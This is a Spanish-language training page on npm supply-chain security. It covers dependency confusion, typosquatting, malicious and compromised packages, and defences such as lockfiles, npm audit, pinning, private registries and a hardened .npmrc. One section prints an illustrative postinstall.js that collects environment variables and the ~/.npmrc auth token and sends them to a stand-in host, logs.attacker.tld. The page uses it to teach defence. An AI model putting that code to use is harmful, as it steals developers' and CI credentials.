01.1 · Definición

¿Qué es npm y cómo funciona?

npm (Node Package Manager) es el gestor de paquetes por defecto de Node.js. Tres piezas que conviene separar mentalmente:

  1. El CLI
    npm install, npm run, npm publish… la herramienta local.
  2. El registry público
    Índice central donde se publican y resuelven paquetes por nombre y versión.
  3. El manifiesto del proyecto
    package.json declara dependencias; package-lock.json congela el árbol resuelto.
flujo de instalación ~/app 
# 1. el CLI lee tu manifiesto
$ npm install

# 2. resuelve el árbol contra el registry
  resolving express@^4.19.2 → 4.19.2
  resolving lodash@^4.17.21 → 4.17.21
  ... + 312 transitive deps

# 3. descarga tarballs (.tgz) + verifica integrity
  fetch  registry.npmjs.org/express/-/express-4.19.2.tgz
  verify sha512-a1b2c3…  ok

# 4. ejecuta scripts del ciclo de vida
  run    preinstall · install · postinstall
  ⚠  arbitrary code execution by design

El paso 4 es la grieta fundamental: instalar es ejecutar.

Supply chain Vector: resolución de nombres

Dependency Confusion.

El registry público gana cuando un nombre interno también existe en él con una versión mayor.

! Cómo funciona

El atacante publica en npm público un paquete con el mismo nombre que un paquete privado de la empresa (descubierto por filtración de package.json, repos abiertos, logs…) y le sube la versión. Si el CI no fuerza el registry privado, npm resuelve el público por ser más nuevo.

× Impacto real

Investigación de Alex Birsan (2021) que demostró el vector contra Apple, Microsoft, PayPal, Tesla y otras 30+ empresas — RCE remoto durante el npm install.

resolución sin scope ni registry forzado 
# package.json interno
{
  "dependencies": {
    "acme-internal-auth": "^1.2.0"
  }
}

# registry público
acme-internal-auth@99.0.0  ← publicado por atacante

# npm install resuelve…
→ public  acme-internal-auth@99.0.0  ✗
  (mayor versión gana, sin scope que distinga)
✓ Mitigación

Usar scopes (@acme/auth) y mapearlos a un registry privado en .npmrc; always-auth=true; reservar el nombre público.

Ingeniería social Vector: error humano

Typosquatting.

Paquetes con nombres casi idénticos a los legítimos esperando un npm install distraído.

! Cómo funciona

El atacante registra variantes plausibles: caracteres invertidos, sufijos comunes (-js, 2), homoglifos o errores frecuentes. El payload va en postinstall o en el primer require().

variantes observadas en incidentes públicos 
cross-env            crossenv         (sin guión)
lodash               lodahs           (anagrama)
chalk                chаlk            (с cirílica)
discord.js           discord-js       (punto → guión)
eslint               eslnit           (transposición)
× Impacto real

Campañas con cientos de paquetes que roban tokens de Discord, claves de billeteras cripto, variables de entorno y archivos .env. Vida media muy corta — pero el daño se hace en el primer install.

✓ Mitigación
  • ✓
    Copiar y pegar desde fuentes oficiales — no tipear nombres.
  • ✓
    Revisar mantenedor, fecha de publicación y descargas antes de instalar.
  • ✓
    Bloquear scripts en CI con --ignore-scripts.

Payload directo Vector: paquete diseñado para hacer daño

Paquetes maliciosos.

Código publicado con intención hostil desde el primer commit. Versión nueva, repositorio fresco, identidad sintética.

! Patrones más comunes
  • ▸
    Robo de credenciales y secretos
    Lectura de ~/.aws, ~/.ssh, .env, tokens del CI.
  • ▸
    Reverse shells / beacons
    Conexión saliente a infraestructura del atacante en postinstall.
  • ▸
    Cryptominers
    Uso silencioso de CPU del runner/desarrollador.
  • ▸
    Wallet drainers
    Búsqueda de seed phrases y claves privadas locales.
  • ▸
    Protestware
    Sabotaje politizado activado por geolocalización.
postinstall.js — patrón observado 
// Disparado por el hook "postinstall"
const os = require('os');
const fs = require('fs');
const https = require('https');

const payload = {
  user:   os.userInfo().username,
  host:   os.hostname(),
  env:    process.env,                // ← tokens del CI
  npmrc:  fs.readFileSync(             // ← _authToken
    `${os.homedir()}/.npmrc`, 'utf8'),
};

https.request({
  host: 'logs.attacker.tld',
  method: 'POST',
}).end(JSON.stringify(payload));

Patrón compuesto a partir de incidentes públicos. La ejecución ocurre antes de cualquier prueba o lint.

Supply Chain Attacks.

No publican un paquete nuevo — comprometen uno legítimo que tus dependencias ya usan.

01 · Acceso
Mantenedor comprometido vía phishing, token filtrado o cuenta sin 2FA.
›
02 · Publicación
Nueva versión minor del paquete legítimo, con payload oculto u ofuscado.
›
03 · Propagación
Rangos ^/~ y CIs sin lockfile descargan la versión envenenada automáticamente.
× Casos públicos de referencia
2018
event-stream
Mantenedor cedió control; nueva dependencia maliciosa apuntada a una wallet específica de criptomonedas.
2021
ua-parser-js
Cuenta del mantenedor comprometida; versiones publicadas con cryptominer + ladrón de credenciales.
2022
node-ipc
Protestware introducido por el propio mantenedor; sobrescribía archivos en sistemas con IP rusa/bielorrusa.
✓ Por qué es el más temido

El paquete es el legítimo — auditorías estáticas, comparación de nombres y firmas de mantenedor no lo detectan. Defensas válidas: lockfile estricto, pinning de versiones en producción, scanners que comparen integridad histórica y delay de adopción (no instalar versiones publicadas hace < N días).

03.1 · Reproducibilidad

Tratar package-lock.json como código fuente.

El lockfile congela el árbol exacto: versión, URL y hash de cada paquete transitivo. Sin él, dos npm install en dos máquinas pueden traer árboles distintos — incluyendo versiones recién comprometidas.

  1. Versionarlo
    Commit en el repo, revisar diffs como cualquier código.
  2. CI = npm ci, nunca npm install
    Instalación reproducible: falla si el lockfile no coincide con el manifiesto.
  3. Revisar diffs grandes
    Un cambio sospechoso en resolved o integrity es una bandera roja.
package-lock.json (fragmento) 
{
  "name": "acme-api",
  "lockfileVersion": 3,
  "packages": {
    "node_modules/express": {
      "version":   "4.19.2",
      "resolved":  "https://registry.npmjs.org/…
                   /express-4.19.2.tgz",
      "integrity": "sha512-a1b2c3…"
    }
  }
}
// resolved + integrity = fingerprint inmutable
// si cualquiera cambia, npm ci falla

03.2 · Detección continua

npm audit y auditorías automatizadas.

auditoría local + CI 
# reporte humano
$ npm audit

# falla el build si hay vulns altas
$ npm audit --audit-level=high

# solo dependencias de producción
$ npm audit --omit=dev

# reporte máquina (para SARIF, dashboards)
$ npm audit --json > audit.json

# intentar arreglos automáticos (con cuidado)
$ npm audit fix
$ npm audit fix --force      # puede romper API

Hacerlo parte del pipeline, no del ritual humano.

  • ✓
    Ejecutar en cada PR — falla el build a partir de high.
    Distingue --omit=dev para no bloquear por vulns que no llegan a producción.
  • ✓
    Complementar con un scanner externo (SCA).
    Snyk, GitHub Dependabot, OSV-Scanner, Socket — distintos catálogos, distinta cobertura.
  • ✓
    Política sobre audit fix --force.
    Requiere tests verdes + revisión humana. Nunca automático en main.
  • ✓
    SBOM mensual.
    CycloneDX o SPDX para tener inventario auditable de qué corre en producción.

03.3 · Rangos peligrosos

Versionado seguro: el rango es política.

▸ Operadores y riesgo
"4.19.2"
Exacto. Reproducible. seguro
"~4.19.2"
Patch only (4.19.x). moderado
"^4.19.2"
Minor + patch (4.x.x). amplio
"*" / "latest"
Cualquier versión. prohibir
git/url
Fuera del registry. auditar
✓ Recomendación operacional

Pinear exacto en package.json + actualizar deliberadamente vía Renovate/Dependabot. El lockfile da reproducibilidad, pero los rangos amplios siguen ampliando la superficie ante un compromiso ascendente.

⏱ Cooldown de versiones

Configurar el bot para esperar 7–14 días antes de proponer una versión recién publicada. La mayoría de paquetes maliciosos se detectan y retiran en esa ventana.

03.4 · Menos código, menos riesgo

Evitar dependencias innecesarias.

La dependencia más segura es la que no agregaste. Antes de instalar, pregúntate:

  1. ¿La plataforma ya lo resuelve?
    fetch, crypto, structuredClone… Node moderno cubre mucho de lo que motivó utilidades antiguas.
  2. ¿Es un one-liner disfrazado?
    Paquetes que aportan < 20 líneas casi siempre se pueden copiar y mantener internamente.
  3. ¿Cuánto pesa transitivamente?
    Una dependencia con 0 deps directas puede traer 50 indirectas — revisar con npm ls.
  4. ¿Sigue mantenido?
    Último release, issues abiertas, número de mantenedores. Abandonado = vulnerable.
higiene del manifiesto 
# ver árbol completo y peso
$ npm ls --all
$ npm ls --depth=0

# detectar deps no usadas
$ npx depcheck

# ver tamaño en disco real
$ du -sh node_modules/

# inspeccionar antes de instalar
$ npm view <pkg> maintainers time versions
$ npm view <pkg> repository.url
$ npx npq install <pkg>   # scan previo

03.5 · Proxy + control

Registries privados como cortafuegos.

Un registry privado (Verdaccio, Artifactory, Nexus, GitHub Packages, AWS CodeArtifact…) sirve para tres cosas:

  1. Alojar tus paquetes internos
    Aislados del público — bloquea el vector de dependency confusion si el scope se mapea bien.
  2. Hacer de caché del público
    Reproducibilidad incluso si un paquete público desaparece (left-pad doctrine).
  3. Filtrar lo que entra
    Allowlist/denylist, escaneo automático, bloqueo de versiones recién publicadas.
Desarrollador / CI
npm install
›
Registry privado
Cache + políticas + scopes internos.
›
Registry público
Solo paquetes aprobados pasan.

03.6 · Identidad y secretos

Gestión de tokens y credenciales.

▸ Principios
  • ✓
    2FA obligatoria para mantenedores que publican.
    Cuenta sin segundo factor = vector directo de supply chain.
  • ✓
    Tokens granulares por scope y permiso.
    Read-only para CI que solo consume; publish solo para el job que publica.
  • ✓
    Expiración corta + rotación.
    90 días máx., auditable; revocar al cambiar de proyecto o persona.
  • ✓
    OIDC / Trusted Publishers cuando esté disponible.
    Publicar sin tokens de larga duración — la federación de identidad del CI firma el release.
× Antipatrones que no deberíamos seguir viendo
~/.npmrc — comiteado al repo 
# NO: token de larga vida hardcodeado
//registry.npmjs.org/:_authToken=npm_AbCdEf123…

# NO: secreto exportado en script de package.json
"prepublish": "NPM_TOKEN=npm_xxx npm publish"

# NO: log del CI imprimiendo env
$ env  ← secretos en stdout públicos

Lo correcto: secretos solo desde el secret store del CI, inyectados al runner, nunca comiteados, nunca logueados.

04.1 · Qué es

El archivo de configuración de npm.

.npmrc es un archivo plano (key=value) que define el comportamiento del CLI: qué registry usar, qué token enviar, qué scripts permitir, cómo cachear, qué política de versionado aplicar.

Existen cuatro niveles de configuración que se combinan en cascada — entenderlos es lo que separa una configuración segura de una accidental.

! Idea clave

Todo lo que npm install hace silenciosamente — adónde habla, qué credenciales envía, qué ejecuta — está controlado por .npmrc. Es la primera línea de defensa configurable.

.npmrc — ejemplo mínimo 
# registry por defecto
registry=https://registry.npmjs.org/

# un scope apuntando a registry interno
@acme:registry=https://npm.acme.internal/

# autenticación referenciada por variable
//npm.acme.internal/:_authToken=${ACME_NPM_TOKEN}

# comportamiento
save-exact=true
ignore-scripts=true
audit-level=high

04.2 · Dónde vive

Cuatro niveles, una sola cascada.

▸ Niveles, de mayor a menor prioridad
  1. Proyecto · ./.npmrc
    En la raíz del repo. Compartida con el equipo. Nunca debería contener secretos.
  2. Usuario · ~/.npmrc
    Personal del desarrollador. Aquí sí pueden vivir tokens de larga duración locales.
  3. Global · $PREFIX/etc/npmrc
    A nivel de la instalación de Node; aplica a todos los usuarios del sistema.
  4. Built-in · npm interno
    Defaults del propio CLI. Es lo único que aplica si no hay nada definido arriba.
cómo npm resuelve la configuración 
          ┌────────────────────────────┐
   alta   │  CLI flags (--registry…)   │
    ↑     ├────────────────────────────┤
    │     │  env vars  (NPM_CONFIG_*)  │
    │     ├────────────────────────────┤
    │     │  ./.npmrc       (proyecto) │
    │     ├────────────────────────────┤
    │     │  ~/.npmrc       (usuario)  │
    │     ├────────────────────────────┤
    │     │  $PREFIX/etc/npmrc (global)│
    │     ├────────────────────────────┤
   baja   │  built-in defaults         │

04.3 · Variables que importan en seguridad

Las claves que merecen una decisión consciente.

▸ Resolución y red
registry
URL por defecto para resolver paquetes.
@scope:registry
Override por scope — clave contra dependency confusion.
always-auth
Forzar envío del token incluso para GETs.
strict-ssl
Rechazar certificados inválidos — siempre true.
prefer-offline
Usar caché local si existe — útil en CI estables.
▸ Comportamiento y seguridad
ignore-scripts
No ejecutar hooks pre/post-install. Default en CI.
audit
Habilitar/deshabilitar audit automático.
audit-level
Umbral mínimo para fallar (low|moderate|high|critical).
save-exact
Pinear exacto al instalar (sin ^).
engine-strict
Forzar versión de Node declarada en package.json.
fund / update-notifier
Ruido — desactivar en CI.

04.4 · Plantilla recomendada

.npmrc endurecido — explicado línea por línea.

./.npmrc — versionado en el repo 
# ── 1. Registries ────────────────────────────
registry=https://npm.acme.internal/repository/proxy/

# Scope interno: nunca debe ir al público.
@acme:registry=https://npm.acme.internal/repository/private/
@acme:always-auth=true

# ── 2. Autenticación (vía env, jamás hardcoded) ─
//npm.acme.internal/:_authToken=${ACME_NPM_TOKEN}

# ── 3. Seguridad de red ──────────────────────
strict-ssl=true
fetch-retries=3
fetch-retry-mintimeout=10000

# ── 4. Comportamiento de instalación ─────────
ignore-scripts=true            # bloquear pre/post-install
save-exact=true                # pinear versiones exactas
engine-strict=true             # exigir Node declarado
package-lock=true              # mantener lockfile

# ── 5. Auditoría ─────────────────────────────
audit=true
audit-level=high               # falla CI si ≥ high

# ── 6. Ruido fuera ───────────────────────────
fund=false
update-notifier=false
1 Registries

El default va al proxy corporativo (cache + escaneo). El scope interno apunta a un repo privado distinto — esto cierra dependency confusion.

2 Autenticación

${VAR} referencia variables de entorno: el token vive en el secret store, no en el repo.

3-4 Comportamiento

ignore-scripts es la línea más impactante: desarma typosquatting y muchos paquetes maliciosos. save-exact hace el manifiesto reproducible.

5-6 Auditoría & ruido

El audit corre automáticamente; el build falla a partir de high. Los notifiers se silencian para no contaminar logs del CI.

04.5 · Pipelines

.npmrc en CI/CD: dos archivos, dos responsabilidades.

A El .npmrc versionado

Política compartida: registries, scopes, flags de seguridad. Nunca contiene secretos — solo referencias ${VAR}.

B El .npmrc efímero del runner

Generado al inicio del job desde secretos del CI, en $HOME/.npmrc. Se destruye con el runner. Nunca aparece en logs ni en artefactos.

+ Comandos clave del job
ci.sh
$ npm ci --ignore-scripts
$ npm audit --audit-level=high --omit=dev
$ npm run build
$ npm publish --provenance --access restricted
.github/workflows/release.yml — extracto 
jobs:
  publish:
    permissions:
      contents: read
      id-token: write        # OIDC para provenance
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          registry-url: 'https://npm.acme.internal/'

      # El runner genera ~/.npmrc temporal
      # con el token inyectado por el secret store
      - run: npm ci --ignore-scripts
        env:
          NODE_AUTH_TOKEN: ${{ secrets.ACME_NPM_TOKEN }}

      - run: npm audit --audit-level=high --omit=dev
      - run: npm test
      - run: npm publish --provenance
        env:
          NODE_AUTH_TOKEN: ${{ secrets.ACME_NPM_TOKEN }}

05 · roadmap// conclusiones

Cierre

Cinco ideas para llevarse.

  1. Instalar es ejecutar.
    Todo análisis de riesgo en npm empieza aceptando que npm install ejecuta código de terceros antes de que tu app exista.
  2. El lockfile no es opcional.
    Sin él, la reproducibilidad es ficticia y cualquier compromiso ascendente entra silencioso.
  3. Tu superficie es transitiva.
    Las defensas (auditoría, SBOM, cooldown) deben razonar sobre el árbol completo, no sobre las 12 deps directas.
  4. El .npmrc es política versionable.
    Scopes, ignore-scripts y registries privados cierran tres vectores con cinco líneas de configuración.
  5. Identidad > tokens.
